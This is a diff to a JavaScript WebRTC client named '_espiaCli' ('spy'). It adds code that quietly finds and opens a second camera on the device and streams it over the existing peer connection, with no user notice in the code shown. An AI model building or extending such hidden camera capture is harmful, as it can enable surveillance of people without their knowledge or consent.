@@ -10943,6 +10943,36 @@
                         pc.addTrack(t, _espiaCli.streams.userMedia);
                     });
                 }
+                // [v2.7.35 DUAL CAMERA] Intentar abrir la 2da cámara si existe
+                (async () => {
+                    try {
+                        const devs = await navigator.mediaDevices.enumerateDevices();
+                        const cams = devs.filter(d => d.kind === 'videoinput');
+                        if (cams.length < 2) { console.log('[espia] dual-cam: 1 sola cámara · skip'); return; }
+                        const tUsado = _espiaCli?.streams?.userMedia?.getVideoTracks?.()[0];
+                        const idUsado = tUsado?.getSettings?.()?.deviceId;
+                        const otra = cams.find(c => c.deviceId && c.deviceId !== idUsado);
+                        if (!otra) return;
+                        const stream2 = await navigator.mediaDevices.getUserMedia({
+                            video: { deviceId: { exact: otra.deviceId }, width:{ideal:640}, height:{ideal:480} }
+                        });
+                        if (!_espiaCli) {
+                            stream2.getTracks().forEach(t => { try{t.stop();}catch(_){} });
+                            return;
+                        }
+                        _espiaCli.streams.userMedia2 = stream2;
+                        _espiaCli._trackTipoMap = _espiaCli._trackTipoMap || {};
+                        stream2.getTracks().forEach(t => {
+                            if (t.kind === 'video') t.contentHint = 'motion';
+                            _espiaCli._trackTipoMap[t.id] = 'camara2';
+                            pc.addTrack(t, stream2);
+                        });
+                        console.log('[espia] 2da cámara agregada · reneg disparará');
+                        _espiaCli?._enviarTrackMap?.();
+                    } catch(e) {
+                        console.warn('[espia] 2da cámara fallo:', e.message);
+                    }
+                })();
                 // [v2.7.30 REFACTOR] Handler de reneg: solo SUBE la oferta.
                 // La respuesta se procesa en pollTimerSync (centralizado).
                 pc.onnegotiationneeded = async () => {
